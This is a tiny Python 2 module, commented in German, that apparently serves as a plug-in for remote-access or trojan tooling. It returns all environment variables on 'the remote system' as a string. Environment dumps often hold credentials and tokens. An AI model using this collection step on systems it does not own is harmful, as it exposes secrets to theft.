import os

#Dieses Modul liefert alle Umgebungsvariablen zurueck, 
#die auf dem entfernten System gesetzt sind.
def run(**args):
    print "[*] In enviroment module."
    return str(os.environ)